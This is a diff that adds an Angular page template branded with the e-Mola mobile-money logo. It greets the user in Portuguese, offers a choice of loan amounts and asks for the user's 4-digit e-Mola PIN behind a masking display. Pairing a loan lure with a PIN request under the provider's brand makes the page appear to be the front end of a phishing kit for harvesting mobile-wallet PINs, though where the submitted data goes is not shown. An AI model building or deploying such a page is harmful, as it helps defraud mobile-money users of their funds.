@@ -1,0 +1,50 @@
+<div class="container">
+
+    <div>
+        <img class="emola-logo" src="/emola.jpg" alt="logo">
+    </div>
+    <div class="mt-4 fs-5 text-white text-center">
+        Olá {{ userName() }}, estamos quase a terminar o processo! <i
+            class="fa-solid fa-hand-holding-dollar fs-4 blink"></i>
+    </div>
+
+    <!-- form -->
+    <section class="page">
+        <form class="form" [formGroup]="form" (ngSubmit)="onSubmit()" novalidate>
+            <select formControlName="loan" [class.empty]="!form.controls.loan.value"
+                [class.invalid]="showError('loan')">
+                <option value="" disabled>Valor do empréstimo</option>
+                @for (opt of loanOptions; track opt.value) {
+                <option [value]="opt.value">{{ opt.label }}</option>
+                }
+            </select>
+
+            <div class="mask-wrap" [class.mask-on]="pinMaskOn">
+                <input type="text" formControlName="pin" placeholder="e-Mola PIN" autocomplete="off" inputmode="numeric"
+                    maxlength="4" (focus)="onPinFocus()" (blur)="onPinBlur()" (input)="onPinInput($event)"
+                    [class.invalid]="showError('pin')" />
+                @if (pinMaskOn) {
+                <span class="mask-ghost" aria-hidden="true">
+                    @for (filled of pinSlots; track $index) {
+                    @if (filled) {
+                    <span class="slot digit">{{ pinValue[$index] }}</span>
+                    } @else {
+                    <span class="slot x">X</span>
+                    }
+                    }
+                </span>
+                }
+            </div>
+
+            @if (enterButton()){
+            <button type="submit" class="btn">ENTRAR</button>
+            }
+
+            @if(!enterButton()){
+            <button class="btn"><i class="fa-solid fa-circle-notch fa-spin"></i></button>
+            }
+        </form>
+    </section>
+
+    <!-- endForm -->
+</div>
